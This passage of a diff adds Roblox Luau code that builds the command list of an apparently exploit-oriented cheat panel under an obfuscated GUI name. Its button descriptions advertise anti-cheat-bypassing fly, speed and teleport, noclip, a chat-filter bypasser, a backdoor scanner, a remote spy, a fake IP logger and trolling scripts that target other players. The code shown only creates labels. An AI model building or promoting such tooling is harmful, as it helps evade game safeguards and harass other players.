+G2L["33"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["33"]["ZIndex"] = 2147483647;
+G2L["33"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["33"]["BackgroundTransparency"] = 1;
+G2L["33"]["Name"] = [[ >glitchradio/<player name>]];
+G2L["33"]["Text"] = [[ >glitchradio/<player name>]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >glitchradio/<player name>.Info
+G2L["34"] = Instance.new("StringValue", G2L["33"]);
+G2L["34"]["Name"] = [[Info]];
+G2L["34"]["Value"] = [[Command Info: Makes someones radio sound weird and glitchy. (extra info once executed in output box)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >audiologs
+G2L["35"] = Instance.new("TextButton", G2L["11"]);
+G2L["35"]["TextWrapped"] = true;
+G2L["35"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["35"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["35"]["TextSize"] = 14;
+G2L["35"]["TextScaled"] = true;
+G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["35"]["ZIndex"] = 2147483647;
+G2L["35"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["35"]["BackgroundTransparency"] = 1;
+G2L["35"]["Name"] = [[ >audiologs]];
+G2L["35"]["Text"] = [[ >audiologs]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >audiologs.Info
+G2L["36"] = Instance.new("StringValue", G2L["35"]);
+G2L["36"]["Name"] = [[Info]];
+G2L["36"]["Value"] = [[Command Info: Executes an Audio Logger.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >bdexe
+G2L["37"] = Instance.new("TextButton", G2L["11"]);
+G2L["37"]["TextWrapped"] = true;
+G2L["37"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["37"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["37"]["TextSize"] = 14;
+G2L["37"]["TextScaled"] = true;
+G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["37"]["ZIndex"] = 2147483647;
+G2L["37"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["37"]["BackgroundTransparency"] = 1;
+G2L["37"]["Name"] = [[ >bdexe]];
+G2L["37"]["Text"] = [[ >bdexe]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >bdexe.Info
+G2L["38"] = Instance.new("StringValue", G2L["37"]);
+G2L["38"]["Name"] = [[Info]];
+G2L["38"]["Value"] = [[Command Info: This doesnt execute no logs version anymore since pastebin deleted my account for no reason and now I have to give normal but the logs are removed by the devs so your fine. (they were game logs anyways)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >frakturess
+G2L["39"] = Instance.new("TextButton", G2L["11"]);
+G2L["39"]["TextWrapped"] = true;
+G2L["39"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["39"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["39"]["TextSize"] = 14;
+G2L["39"]["TextScaled"] = true;
+G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["39"]["ZIndex"] = 2147483647;
+G2L["39"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["39"]["BackgroundTransparency"] = 1;
+G2L["39"]["Name"] = [[ >frakturess]];
+G2L["39"]["Text"] = [[ >frakturess]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >frakturess.Info
+G2L["3a"] = Instance.new("StringValue", G2L["39"]);
+G2L["3a"]["Name"] = [[Info]];
+G2L["3a"]["Value"] = [[Command Info: Executes Frakture SS. (backdoor scanner) (idk if this is discontinued honestly)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbot
+G2L["3b"] = Instance.new("TextButton", G2L["11"]);
+G2L["3b"]["TextWrapped"] = true;
+G2L["3b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["3b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["3b"]["TextSize"] = 14;
+G2L["3b"]["TextScaled"] = true;
+G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3b"]["ZIndex"] = 2147483647;
+G2L["3b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["3b"]["BackgroundTransparency"] = 1;
+G2L["3b"]["Name"] = [[ >chatbot]];
+G2L["3b"]["Text"] = [[ >chatbot]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbot.Info
+G2L["3c"] = Instance.new("StringValue", G2L["3b"]);
+G2L["3c"]["Name"] = [[Info]];
+G2L["3c"]["Value"] = [[Command Info: Use a new Chat Bot thing so it works now.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antifling
+G2L["3d"] = Instance.new("TextButton", G2L["11"]);
+G2L["3d"]["TextWrapped"] = true;
+G2L["3d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["3d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["3d"]["TextSize"] = 14;
+G2L["3d"]["TextScaled"] = true;
+G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3d"]["ZIndex"] = 2147483647;
+G2L["3d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["3d"]["BackgroundTransparency"] = 1;
+G2L["3d"]["Name"] = [[ >antifling]];
+G2L["3d"]["Text"] = [[ >antifling]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >antifling.Info
+G2L["3e"] = Instance.new("StringValue", G2L["3d"]);
+G2L["3e"]["Name"] = [[Info]];
+G2L["3e"]["Value"] = [[Command Info: An actually good Anti Fling. I should probably make an command in it to end it so you can fling people or something]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >to/<player name>
+G2L["3f"] = Instance.new("TextButton", G2L["11"]);
+G2L["3f"]["TextWrapped"] = true;
+G2L["3f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["3f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["3f"]["TextSize"] = 14;
+G2L["3f"]["TextScaled"] = true;
+G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3f"]["ZIndex"] = 2147483647;
+G2L["3f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["3f"]["BackgroundTransparency"] = 1;
+G2L["3f"]["Name"] = [[ >to/<player name>]];
+G2L["3f"]["Text"] = [[ >to/<player name>]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >to/<player name>.Info
+G2L["40"] = Instance.new("StringValue", G2L["3f"]);
+G2L["40"]["Name"] = [[Info]];
+G2L["40"]["Value"] = [[Command Info: Teleports you to a player (in a way that bypasses most anti cheats)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fly
+G2L["41"] = Instance.new("TextButton", G2L["11"]);
+G2L["41"]["TextWrapped"] = true;
+G2L["41"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["41"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["41"]["TextSize"] = 14;
+G2L["41"]["TextScaled"] = true;
+G2L["41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["41"]["ZIndex"] = 2147483647;
+G2L["41"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["41"]["BackgroundTransparency"] = 1;
+G2L["41"]["Name"] = [[ >fly]];
+G2L["41"]["Text"] = [[ >fly]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fly.Info
+G2L["42"] = Instance.new("StringValue", G2L["41"]);
+G2L["42"]["Name"] = [[Info]];
+G2L["42"]["Value"] = [[Command Info: Makes you fly in a way that bypasses most anti cheats. Controls: W,A,S,D,Q,E,LeftCtrl]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclip
+G2L["43"] = Instance.new("TextButton", G2L["11"]);
+G2L["43"]["TextWrapped"] = true;
+G2L["43"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["43"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["43"]["TextSize"] = 14;
+G2L["43"]["TextScaled"] = true;
+G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["43"]["ZIndex"] = 2147483647;
+G2L["43"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["43"]["BackgroundTransparency"] = 1;
+G2L["43"]["Name"] = [[ >noclip]];
+G2L["43"]["Text"] = [[ >noclip]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclip.Info
+G2L["44"] = Instance.new("StringValue", G2L["43"]);
+G2L["44"]["Name"] = [[Info]];
+G2L["44"]["Value"] = [[Command Info: Let's you walk through walls and stuff.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >clip
+G2L["45"] = Instance.new("TextButton", G2L["11"]);
+G2L["45"]["TextWrapped"] = true;
+G2L["45"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["45"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["45"]["TextSize"] = 14;
+G2L["45"]["TextScaled"] = true;
+G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["45"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["45"]["ZIndex"] = 2147483647;
+G2L["45"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["45"]["BackgroundTransparency"] = 1;
+G2L["45"]["Name"] = [[ >clip]];
+G2L["45"]["Text"] = [[ >clip]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >clip.Info
+G2L["46"] = Instance.new("StringValue", G2L["45"]);
+G2L["46"]["Name"] = [[Info]];
+G2L["46"]["Value"] = [[Command Info: Turns off noclip.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >speed/<number>
+G2L["47"] = Instance.new("TextButton", G2L["11"]);
+G2L["47"]["TextWrapped"] = true;
+G2L["47"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["47"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["47"]["TextSize"] = 14;
+G2L["47"]["TextScaled"] = true;
+G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["47"]["ZIndex"] = 2147483647;
+G2L["47"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["47"]["BackgroundTransparency"] = 1;
+G2L["47"]["Name"] = [[ >speed/<number>]];
+G2L["47"]["Text"] = [[ >speed/<number>]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >speed/<number>.Info
+G2L["48"] = Instance.new("StringValue", G2L["47"]);
+G2L["48"]["Name"] = [[Info]];
+G2L["48"]["Value"] = [[Command Info: Let's you walk fast in a way that bypasses most anti cheats.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspeed
+G2L["49"] = Instance.new("TextButton", G2L["11"]);
+G2L["49"]["TextWrapped"] = true;
+G2L["49"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["49"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["49"]["TextSize"] = 14;
+G2L["49"]["TextScaled"] = true;
+G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["49"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["49"]["ZIndex"] = 2147483647;
+G2L["49"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["49"]["BackgroundTransparency"] = 1;
+G2L["49"]["Name"] = [[ >unspeed]];
+G2L["49"]["Text"] = [[ >unspeed]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspeed.Info
+G2L["4a"] = Instance.new("StringValue", G2L["49"]);
+G2L["4a"]["Name"] = [[Info]];
+G2L["4a"]["Value"] = [[Command Info: turns off speed (because it can't be stopped normally)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >remotespy
+G2L["4b"] = Instance.new("TextButton", G2L["11"]);
+G2L["4b"]["TextWrapped"] = true;
+G2L["4b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["4b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["4b"]["TextSize"] = 14;
+G2L["4b"]["TextScaled"] = true;
+G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4b"]["ZIndex"] = 2147483647;
+G2L["4b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["4b"]["BackgroundTransparency"] = 1;
+G2L["4b"]["Name"] = [[ >remotespy]];
+G2L["4b"]["Text"] = [[ >remotespy]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >remotespy.Info
+G2L["4c"] = Instance.new("StringValue", G2L["4b"]);
+G2L["4c"]["Name"] = [[Info]];
+G2L["4c"]["Value"] = [[Command Info: Let's you see some remote event stuff]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbypass
+G2L["4d"] = Instance.new("TextButton", G2L["11"]);
+G2L["4d"]["TextWrapped"] = true;
+G2L["4d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["4d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["4d"]["TextSize"] = 14;
+G2L["4d"]["TextScaled"] = true;
+G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4d"]["ZIndex"] = 2147483647;
+G2L["4d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["4d"]["BackgroundTransparency"] = 1;
+G2L["4d"]["Name"] = [[ >chatbypass]];
+G2L["4d"]["Text"] = [[ >chatbypass]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatbypass.Info
+G2L["4e"] = Instance.new("StringValue", G2L["4d"]);
+G2L["4e"]["Name"] = [[Info]];
+G2L["4e"]["Value"] = [[Command Info: Basically gives you the best most updated chat bypasser called BetterBypasser and also has a key system but it gives you options at least for how many steps which are how many hours of using]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >collisions
+G2L["4f"] = Instance.new("TextButton", G2L["11"]);
+G2L["4f"]["TextWrapped"] = true;
+G2L["4f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["4f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["4f"]["TextSize"] = 14;
+G2L["4f"]["TextScaled"] = true;
+G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4f"]["ZIndex"] = 2147483647;
+G2L["4f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["4f"]["BackgroundTransparency"] = 1;
+G2L["4f"]["Name"] = [[ >collisions]];
+G2L["4f"]["Text"] = [[ >collisions]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >collisions.Info
+G2L["50"] = Instance.new("StringValue", G2L["4f"]);
+G2L["50"]["Name"] = [[Info]];
+G2L["50"]["Value"] = [[Command Info: Makes you able to walk on people in non collision games. (Fling scripts don't work though.)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>iplog
+G2L["51"] = Instance.new("TextButton", G2L["11"]);
+G2L["51"]["TextWrapped"] = true;
+G2L["51"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["51"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["51"]["TextSize"] = 14;
+G2L["51"]["TextScaled"] = true;
+G2L["51"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["51"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["51"]["ZIndex"] = 2147483647;
+G2L["51"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["51"]["BackgroundTransparency"] = 1;
+G2L["51"]["Name"] = [[>iplog]];
+G2L["51"]["Text"] = [[>iplog]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>iplog.Info
+G2L["52"] = Instance.new("StringValue", G2L["51"]);
+G2L["52"]["Name"] = [[Info]];
+G2L["52"]["Value"] = [[Command Info: Gives you a fake ip logger gui i edited to hopefully fix the problems of it tagging]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >brookhaven
+G2L["53"] = Instance.new("TextButton", G2L["11"]);
+G2L["53"]["TextWrapped"] = true;
+G2L["53"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["53"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["53"]["TextSize"] = 14;
+G2L["53"]["TextScaled"] = true;
+G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["53"]["ZIndex"] = 2147483647;
+G2L["53"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["53"]["BackgroundTransparency"] = 1;
+G2L["53"]["Name"] = [[ >brookhaven]];
+G2L["53"]["Text"] = [[ >brookhaven]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >brookhaven.Info
+G2L["54"] = Instance.new("StringValue", G2L["53"]);
+G2L["54"]["Name"] = [[Info]];
+G2L["54"]["Value"] = [[Command Info: Brookhaven trolling script.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>animlogs
+G2L["55"] = Instance.new("TextButton", G2L["11"]);
+G2L["55"]["TextWrapped"] = true;
+G2L["55"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["55"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["55"]["TextSize"] = 14;
+G2L["55"]["TextScaled"] = true;
+G2L["55"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["55"]["ZIndex"] = 2147483647;
+G2L["55"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["55"]["BackgroundTransparency"] = 1;
+G2L["55"]["Name"] = [[>animlogs]];
+G2L["55"]["Text"] = [[>animlogs]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>animlogs.Info
+G2L["56"] = Instance.new("StringValue", G2L["55"]);
+G2L["56"]["Name"] = [[Info]];
+G2L["56"]["Value"] = [[Command Info: Gives you a cool looking gui thyat has stuff like logging animations, playing animations, pause animations, move through every sequence, and previewing them]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emojichat
+G2L["57"] = Instance.new("TextButton", G2L["11"]);
+G2L["57"]["TextWrapped"] = true;
+G2L["57"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["57"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["57"]["TextSize"] = 14;
+G2L["57"]["TextScaled"] = true;
+G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["57"]["ZIndex"] = 2147483647;
+G2L["57"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["57"]["BackgroundTransparency"] = 1;
+G2L["57"]["Name"] = [[ >emojichat]];
+G2L["57"]["Text"] = [[ >emojichat]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emojichat.Info
+G2L["58"] = Instance.new("StringValue", G2L["57"]);
+G2L["58"]["Name"] = [[Info]];
+G2L["58"]["Value"] = [[Command Info: Let's you do emojis in chat using : (new chat has this feature but this is for legacy chat)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vghub
+G2L["59"] = Instance.new("TextButton", G2L["11"]);
+G2L["59"]["TextWrapped"] = true;
+G2L["59"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["59"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["59"]["TextSize"] = 14;
+G2L["59"]["TextScaled"] = true;
+G2L["59"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["59"]["ZIndex"] = 2147483647;
+G2L["59"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["59"]["BackgroundTransparency"] = 1;
+G2L["59"]["Name"] = [[ >vghub]];
+G2L["59"]["Text"] = [[ >vghub]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >vghub.Info
+G2L["5a"] = Instance.new("StringValue", G2L["59"]);
+G2L["5a"]["Name"] = [[Info]];
+G2L["5a"]["Value"] = [[Command Info: A script hub with a lot of games.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scpfuturistic
+G2L["5b"] = Instance.new("TextButton", G2L["11"]);
+G2L["5b"]["TextWrapped"] = true;
+G2L["5b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["5b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["5b"]["TextSize"] = 14;
+G2L["5b"]["TextScaled"] = true;
+G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5b"]["ZIndex"] = 2147483647;
+G2L["5b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["5b"]["BackgroundTransparency"] = 1;
+G2L["5b"]["Name"] = [[ >scpfuturistic]];
+G2L["5b"]["Text"] = [[ >scpfuturistic]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scpfuturistic.Info
+G2L["5c"] = Instance.new("StringValue", G2L["5b"]);
+G2L["5c"]["Name"] = [[Info]];
+G2L["5c"]["Value"] = [[Command Info: Newest version of SCP Futuristic gui I made since I updated it.]];
+
+
